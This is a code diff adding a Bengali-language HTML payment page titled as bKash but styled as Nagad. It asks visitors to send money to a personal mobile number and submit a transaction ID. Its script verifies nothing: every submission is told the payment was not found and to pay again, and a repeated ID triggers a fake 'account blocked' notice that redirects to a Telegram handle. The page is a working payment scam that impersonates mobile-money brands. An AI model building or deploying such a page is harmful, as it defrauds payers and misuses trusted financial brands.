@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>bKash Premium Payment</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #00b28f, #008f7e); /* নগদ এর রঙ */
+      color: #fff;
+      padding: 20px;
+    }
+    .payment-box {
+      max-width: 520px;
+      margin: auto;
+      background: rgba(255, 255, 255, 0.09);
+      border-radius: 24px;
+      padding: 30px;
+      box-shadow: 0 0 40px rgba(0,0,0,0.5);
+      backdrop-filter: blur(12px);
+    }
+    .logo {
+      display: block;
+      height: 60px;
+      margin: 0 auto 20px auto;
+      border-radius: 12px;
+    }
+    h2 {
+      text-align: center;
+      font-size: 26px;
+      margin-bottom: 18px;
+      color: #fff;
+    }
+    .info-section {
+      background: rgba(255,255,255,0.12);
+      border-radius: 14px;
+      padding: 20px;
+      margin-bottom: 22px;
+      font-size: 16px;
+      position: relative;
+    }
+    .label {
+      font-weight: 600;
+      color: #ffd700;
+    }
+    .copy-btn {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      background: #fff;
+      color: #00b28f; /* নগদ এর রঙ */
+      border: none;
+      padding: 6px 12px;
+      border-radius: 6px;
+      font-size: 13px;
+      cursor: pointer;
+    }
+    input {
+      width: 100%;
+      padding: 15px;
+      font-size: 16px;
+      border-radius: 12px;
+      border: none;
+      margin-top: 16px;
+      outline: none;
+    }
+    button.verify {
+      width: 100%;
+      margin-top: 22px;
+      padding: 16px;
+      font-size: 16px;
+      font-weight: bold;
+      background: #fff;
+      color: #00b28f; /* নগদ এর রঙ */
+      border: none;
+      border-radius: 14px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+    button.verify:hover {
+      background: #e0f7f1; /* হালকা সবুজ */
+    }
+    .telegram-btn {
+      margin-top: 26px;
+      text-align: center;
+    }
+    .telegram-btn a {
+      display: inline-flex;
+      align-items: center;
+      text-decoration: none;
+      background: linear-gradient(135deg, #009688, #00796b); /* নগদ এর রঙ */
+      padding: 14px 24px;
+      color: white;
+      border-radius: 50px;
+      font-weight: 600;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.4);
+    }
+    .telegram-btn a .material-icons {
+      margin-right: 10px;
+    }
+    .instructions {
+      font-size: 14px;
+      line-height: 1.6;
+      background: rgba(255,255,255,0.1);
+      border-left: 4px solid #fff;
+      padding: 16px;
+      margin-bottom: 20px;
+      border-radius: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="payment-box">
+    <img src="https://i.postimg.cc/Nfwb9bnw/1710850894.jpg" class="logo" alt="Logo" />
+    <h2> নগদ পেমেন্ট</h2><div class="info-section">
+  <div class="label">পেমেন্ট নাম্বার:</div>
+  <div id="paymentNumber">01855966005</div>
+  <button class="copy-btn" onclick="copyText('paymentNumber')">Copy</button>
+</div>
+
+<div class="info-section">
+  <div class="label">টাকার পরিমাণ:</div>
+  <div id="paymentAmount">লোড হচ্ছে...</div>
+  <button class="copy-btn" onclick="copyText('paymentAmount')">Copy</button>
+</div>
+
+<div class="instructions">
+  *167# ডায়াল করে আপনার Nagad মোবাইল মেনুতে যান অথবা Nagad অ্যাপে যান।<br><br>
+  "Send Money" অপশন সিলেক্ট করুন।<br>
+  প্রাপক নম্বরঃ <strong>01855966005</strong><br>
+  পরিমাণঃ <strong id="amtText">লোড হচ্ছে...</strong><br>
+  আপনার পিন দিয়ে নিশ্চিত করুন।<br>
+  তারপর নিচে আপনার <strong>Transaction ID</strong> দিন এবং VERIFY ক্লিক করুন।
+</div>
+
+<input type="text" id="trxid" placeholder="Transaction ID দিন" />
+<button class="verify" onclick="submitPayment()">VERIFY</button>
+
+<div class="telegram-btn">
+  <a href="https://t.me/SuportX_team_24" target="_blank">
+    <span class="material-icons">send</span> টেলিগ্রামে মেসেজ দিন
+  </a>
+</div>
+
+  </div>  
+<script>
+  window.onload = function () {
+    const savedAmount = localStorage.getItem('selectedAmount');
+    if (savedAmount) {
+      document.getElementById("paymentAmount").innerText = savedAmount;
+      document.getElementById("amtText").innerText = savedAmount;
+    } else {
+      document.getElementById("paymentAmount").innerText = 'প্যাকেজ সিলেক্ট করা হয়নি';
+      document.getElementById("amtText").innerText = 'N/A';
+    }
+  };
+
+  function copyText(id) {
+    const text = document.getElementById(id).innerText;
+    navigator.clipboard.writeText(text);
+    alert("Copied: " + text);
+  }
+
+  function submitPayment() {
+    const trx = document.getElementById("trxid").value.trim();
+    const lastTrx = sessionStorage.getItem("lastTrxID");
+
+    if (!trx) {
+      alert("Transaction ID দিন।");
+      return;
+    }
+
+    if (trx === lastTrx) {
+      alert("একই ট্রানজেকশন দুইবার দেওয়া হয়েছে।\nআপনার একাউন্ট ব্লক হয়েছে।\n\nTelegram এ যোগাযোগ করুন: @SuportX_team_24");
+      return;
+    }
+
+    sessionStorage.setItem("lastTrxID", trx);
+    alert("পেমেন্ট তথ্য এখনো পাওয়া যায়নি। সঠিকভাবে পেমেন্ট করে আবার VERIFY করুন।");
+  }
+</script>
+</body>
+</html>
